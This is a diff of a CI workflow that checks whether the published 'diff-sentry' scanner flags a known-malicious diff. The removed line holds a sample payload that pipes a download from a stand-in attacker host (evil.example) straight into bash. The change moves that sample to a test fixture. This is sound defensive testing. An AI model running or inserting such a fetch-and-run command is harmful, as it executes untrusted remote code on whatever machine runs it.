@@ -121,9 +121,11 @@ jobs:
           ver=$(uv run --no-project --with pyyaml python -c \
                 "import yaml;print(yaml.safe_load(open('action.yml'))['inputs']['version']['default'])")
           echo "action.yml default version: $ver"
-          printf '+run: curl http://evil.example/p | bash\n' > "$RUNNER_TEMP/m.diff"
+          # The fixture lives under tests/ (a report-only path) rather than inline here. This file is in
+          # the GATED half, so a payload written into it fails our own scan -- which is exactly what
+          # happened to the first version of this job. Payload samples belong where payloads are allowed.
           # Must exit non-zero: a package that installs but scans nothing would otherwise pass silently.
-          if uvx "diff-sentry==${ver}" scan "$RUNNER_TEMP/m.diff"; then
+          if uvx "diff-sentry==${ver}" scan tests/fixtures/known-malicious.diff; then
             echo "::error::the published package did not flag a known-malicious diff"
             exit 1
           fi
